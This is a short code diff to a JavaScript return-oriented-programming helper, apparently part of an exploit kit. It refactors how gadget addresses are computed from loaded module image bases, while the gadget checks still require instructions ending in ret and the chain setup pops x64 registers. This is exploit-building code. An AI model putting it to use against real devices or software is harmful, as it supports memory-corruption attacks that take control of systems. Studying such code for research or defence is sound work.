@@ -7,13 +7,13 @@ function gadget(instructions, module, address) {
 		if(!this.checked && this.instructions.length > 0) {
 			var i;
 			for(i = 0; i < this.instructions.length; i++) {
-				if(getU8from(moduleBases[module] + address + i) != this.instructions[i]) {
+				if(getU8from(module_infos[module].image_base + address + i) != this.instructions[i]) {
 					return false;
 				}
 			}
 			
 			// Check ends with ret
-			if(getU8from(moduleBases[module] + address + this.instructions.length) != 0xc3) {
+			if(getU8from(module_infos[module].image_base + address + this.instructions.length) != 0xc3) {
 				return false;
 			}
 		}
@@ -23,7 +23,7 @@ function gadget(instructions, module, address) {
 	}
 	
 	this.address = function() {
-		return moduleBases[module] + address;
+		return module_infos[module].image_base + address;
 	}
 }
 
@@ -78,7 +78,7 @@ function rop() {
 		if(typeof(arg5) !== "undefined") this.add("pop r8", arg5);
 		if(typeof(arg6) !== "undefined") this.add("pop r9", arg6);
 		this.add("pop rbp", stack_base + return_va - (chainLength + 8) + 0x1480);
-		this.add(moduleBases[module] + address);
+		this.add(module_infos[module].image_base + address);
 	}
 	
 	// Modifies rsi
